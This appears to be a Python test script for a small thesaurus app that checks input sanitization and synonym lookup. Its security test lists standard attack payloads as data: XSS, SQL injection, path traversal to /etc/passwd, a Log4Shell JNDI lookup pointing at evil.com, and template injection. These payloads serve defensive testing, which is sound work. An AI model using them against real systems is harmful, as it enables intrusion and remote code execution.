#!/usr/bin/env python3
"""
Test script for Verbum Thesaurus App
Tests the core functionality and security features.
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from app import sanitize_input, get_synonyms

def test_sanitization():
    """Test input sanitization function."""
    print("🧪 Testing input sanitization...")
    
    # Valid inputs
    assert sanitize_input("hello") == "hello"
    assert sanitize_input("Hello") == "hello" 
    assert sanitize_input("co-worker") == "co-worker"
    assert sanitize_input("don't") == "don't"
    
    # Invalid inputs
    assert sanitize_input("hello<script>") == "helloscript"
    assert sanitize_input("hello; DROP TABLE") == "hellodroptable"
    assert sanitize_input("hello123") == "hello"
    assert sanitize_input("") is None
    assert sanitize_input("a" * 51) is None  # Too long
    assert sanitize_input(None) is None
    assert sanitize_input(123) is None
    
    print("✓ Input sanitization tests passed!")

def test_synonyms():
    """Test synonym lookup functionality."""
    print("🧪 Testing synonym lookup...")
    
    # Test with common words
    synonyms = get_synonyms("happy")
    assert isinstance(synonyms, list)
    assert len(synonyms) > 0
    print(f"Found {len(synonyms)} synonyms for 'happy': {synonyms[:5]}...")
    
    synonyms = get_synonyms("big")
    assert isinstance(synonyms, list)
    assert len(synonyms) > 0
    print(f"Found {len(synonyms)} synonyms for 'big': {synonyms[:5]}...")
    
    # Test with non-existent word
    synonyms = get_synonyms("xyzabc123notaword")
    assert isinstance(synonyms, list)
    assert len(synonyms) == 0
    
    print("✓ Synonym lookup tests passed!")

def test_security():
    """Test security features."""
    print("🧪 Testing security features...")
    
    # Test malicious inputs
    malicious_inputs = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "%3Cscript%3Ealert('xss')%3C/script%3E"
    ]
    
    for malicious in malicious_inputs:
        sanitized = sanitize_input(malicious)
        # Should either be None or contain only safe characters
        if sanitized:
            assert all(c.isalpha() or c in "-'" for c in sanitized)
        print(f"✓ Blocked malicious input: {malicious[:20]}...")
    
    print("✓ Security tests passed!")

if __name__ == '__main__':
    print("🔬 Running Verbum Tests...")
    print("=" * 50)
    
    try:
        test_sanitization()
        test_synonyms()
        test_security()
        
        print("=" * 50)
        print("✅ All tests passed! Verbum is ready to use.")
        
    except Exception as e:
        print(f"✗ Test failed: {e}")
        sys.exit(1)
